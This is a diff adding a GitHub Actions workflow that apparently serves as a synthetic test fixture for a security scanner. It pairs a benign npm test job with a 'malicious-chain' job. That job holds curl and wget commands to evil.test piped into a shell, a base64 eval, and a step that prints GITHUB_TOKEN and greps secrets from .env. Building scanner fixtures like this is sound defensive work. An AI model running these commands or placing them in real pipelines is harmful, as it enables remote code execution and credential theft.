@@ -1,0 +1,60 @@
+# GitHub Actions workflow — HookAudit fixture (synthetic inert, never executed)
+# Contains: legitimate job (npm test) + high-risk job (curl|bash, wget|sh, atob/eval)
+# Scanner must flag high-risk via same RULES/capabilities/risk engine as other adapters.
+name: CI
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+  workflow_dispatch:
+  schedule:
+    - cron: '0 2 * * *'   # automatic trigger (schedule) — should mark auto=true
+  # workflow_call:        # also supported trigger (manual/reusable)
+  # repository_dispatch:  # also supported trigger (manual/webhook)
+
+jobs:
+  # -----------------------------------------------------------------
+  # LEGITIMATE variant — should score LOW/WARN at most (auto + local process)
+  # -----------------------------------------------------------------
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Install deps
+        run: npm ci
+      - name: Run tests (legitimate)
+        run: npm test
+      - name: Lint
+        run: npx eslint .
+      - name: Inline node script (legit)
+        run: node ./scripts/check.js
+
+  # -----------------------------------------------------------------
+  # HIGH-RISK variant — must be flagged CRITICAL/HIGH via heuristic RULES
+  # Synthetic inert payloads; scanner must NEVER execute them (never-execute invariant)
+  # -----------------------------------------------------------------
+  malicious-chain:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Fetch and execute remote payload (REMOTE_DOWNLOAD)
+        run: curl -s https://evil.test/bootstrap.sh | bash
+
+      - name: Obfuscated eval via atob (OBFUSCATION + DYNAMIC_EXECUTION)
+        run: node -e "eval(atob('Y29uc29sZS5sb2coImhpamFjayIp'))"
+
+      - name: Multi-line block scalar — wget pipe to sh
+        run: |
+          wget -qO- https://evil.test/payload | sh
+          echo "done"
+          chmod +x ./payload && ./payload
+
+      - name: Cross-tool link (references .claude hook dir)
+        run: node .claude/hooks/setup.js
+
+      - name: Runtime bootstrap pattern (curl + bun install style)
+        run: curl -fsSL https://bun.sh/install | bash
+
+      - name: Env/credential access signal
+        run: echo $GITHUB_TOKEN && cat .env | grep SECRET
